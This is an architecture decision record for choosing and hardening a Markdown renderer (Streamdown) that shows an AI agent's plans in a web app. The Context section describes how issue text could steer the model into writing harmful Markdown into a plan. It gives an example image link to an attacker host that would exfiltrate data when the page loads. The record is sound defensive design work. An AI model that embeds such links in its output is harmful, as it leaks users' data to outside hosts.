# ADR-0008: Render Markdown in the web app with Streamdown

- **Status:** accepted
- **Date:** 2026-10-15
- **Deciders:** the maintainers, with the project steward as architecture owner
- **Related:** [ADR-0005](0005-prototype-stack.md), [ADR-0007](0007-sandbox-network-policy.md), [`AGENTS.md`](../../AGENTS.md) rule 5

## Context

The agent writes its plans in Markdown, with headings, lists, code and tables. The web app shows them as plain text, so a person who approves a plan reads raw Markdown. The plan is the most important thing a person reads in the loop, because nothing is implemented until they approve it.

The plan comes from the model, and the model reads the issue. Someone who can write issues can try to make the plan contain HTML or links that do harm when the page shows them. An image is the clearest case: a browser loads it as soon as the page opens, so a plan with `![x](https://attacker.example/?d=...)` would send data to that host without anyone clicking.

Later, the web app will also show the agent's messages while it works, so the renderer should handle Markdown that arrives in parts.

[ADR-0005](0005-prototype-stack.md) does not include a Markdown renderer. Rule 5 in `AGENTS.md` asks for an ADR for every new dependency.

## Considered options

1. **Keep plain text.** No dependency, but plans are hard to read.
2. **`react-markdown` with `remark-gfm` and `rehype-sanitize`.** The common choice. It does not handle incomplete Markdown while it streams.
3. **Streamdown.** A drop-in replacement for `react-markdown`, built on the same unified, remark and rehype libraries, which also handles incomplete Markdown. It ships with `rehype-sanitize` and `rehype-harden`, and a confirmation before a link opens.
4. **Our own renderer.** Small, but we would own the security of the parser.

## Decision

We choose option 3: [Streamdown](https://github.com/vercel/streamdown) 2, under Apache-2.0, in `apps/web` only. We use its core package without its plugins, so there is no syntax highlighting, no Mermaid and no maths.

We configure it for untrusted input in `apps/web/src/markdown.tsx`:

- raw HTML is shown as text, not rendered;
- images never load, from any host, including `data:` URLs;
- links keep Streamdown's confirmation before they open, and `javascript:`, `data:` and `file:` links are dropped;
- the output passes through `rehype-sanitize`.

Tests in `apps/web/src/markdown.test.tsx` check each of these rules.

The renderer adds about 500 kB to the JavaScript, or 155 kB compressed. The web app loads it only on the run page, when a plan is shown.

### Reasons

- One library serves both plans now and streamed agent messages later.
- It is built on unified, remark and rehype, which are widely used, and it keeps their sanitising.
- Its defaults suit chat interfaces, not untrusted input, but every default we need to change is a documented option.

### Supporting packages

This ADR also covers what Streamdown installs: the unified, remark, rehype, micromark, mdast and hast packages, `marked`, `remend`, `parse5`, `clsx` and `tailwind-merge`. All are under the MIT, ISC, BSD-2-Clause or Apache-2.0 licence. The Streamdown plugins (`@streamdown/code`, `@streamdown/mermaid`, `@streamdown/math`, `@streamdown/cjk`) are not covered and need their own decision.

## Consequences

- Plans are easier to read and review.
- The web app depends on 116 more packages. Updates need the same care as other dependencies.
- An image in a plan shows as a placeholder. If agents need diagrams later, we will decide how to show them safely.
- Streamdown's defaults allow images and raw HTML. Every place that uses it must go through `Markdown` in `apps/web/src/markdown.tsx`, not `Streamdown` directly.

### Sovereignty impact

1. **Runs anywhere you choose.** No impact. The renderer runs in the browser and is part of the build.
2. **No phone-home.** No impact. Streamdown's core makes no network requests, and the configuration stops plans from loading images from other hosts.
3. **Model-agnostic.** No impact.
4. **Open standards.** No impact. Plans stay CommonMark with GitHub extensions.
5. **Your data stays yours.** Strengthened. A plan cannot make the browser send data to another host by loading an image.
6. **Humans decide.** Strengthened. The plan a person approves is easier to read.
7. **Transparent supply chain.** The new packages are listed in `pnpm-lock.yaml`, and their licences are permissive.
8. **Reference deployment on European infrastructure.** No impact.

## More information

- Streamdown: <https://github.com/vercel/streamdown>
- `rehype-harden`: <https://github.com/vercel-labs/markdown-sanitizers/tree/main/rehype-harden>
